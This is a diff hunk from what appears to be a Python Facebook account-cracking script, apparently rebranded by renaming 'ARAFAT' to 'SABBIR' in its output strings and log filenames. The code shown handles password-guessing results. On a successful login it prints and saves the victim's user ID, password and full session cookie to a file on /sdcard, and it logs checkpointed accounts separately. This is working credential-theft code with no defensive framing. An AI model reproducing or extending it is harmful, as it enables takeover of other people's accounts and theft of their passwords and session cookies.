@@ -277,15 +277,15 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\r\r\033[1;32m[ARAFAT-XD-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
-                open('/sdcard/ARAFAT-XD-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
+                print('\r\r\033[1;32m[SABBIR-XD-OK💙] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
+                open('/sdcard/SABBIR-SR-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-#              print(f"\x1b[38;5;196m[ARAFAT-CP💔] {uid}|{ps}")
-                open('/sdcard/ARAFAT-CP.txt', 'a').write( uid+' | '+ps+' \n')
+#              print(f"\x1b[38;5;196m[SABBIR-CP💔] {uid}|{ps}")
+                open('/sdcard/SABBIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
